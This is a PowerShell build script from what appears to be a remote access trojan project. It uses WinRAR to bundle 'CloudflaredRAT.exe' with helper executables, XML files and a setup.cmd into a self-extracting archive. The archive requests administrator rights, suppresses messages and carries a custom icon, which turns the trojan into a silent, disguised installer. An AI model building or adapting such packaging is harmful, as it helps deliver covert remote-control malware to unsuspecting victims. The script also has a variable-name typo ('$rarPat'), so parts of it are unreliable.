Set-Location -Path $PSScriptRoot
$artifacts = ".\artifacts"
if (!(Test-Path $artifacts)) {
    Write-Error "You need to run and finish the configuration script first"
    exit
}

$programFiles = [System.Environment]::ExpandEnvironmentVariables("%programfiles%")
$rarPath = "$programFiles\WinRAR\WinRAR.exe"
if (!(Test-Path $rarPath)) {
    Write-Warning "WinRAR is not installed to $rarPat - add the folder with WinRAR.exe to your PATH if you see an error below!"
    $rarPath = "WinRAR.exe"
}

Start-Process -FilePath $rarPath -ArgumentList "a -afrar -cfg- -iadm -inul -k -iiconicon.ico -r -s -tl -y -zartifacts\sfx.cfg CloudflaredRAT.exe bridge.exe manager.exe artifacts\*.xml artifacts\setup.cmd"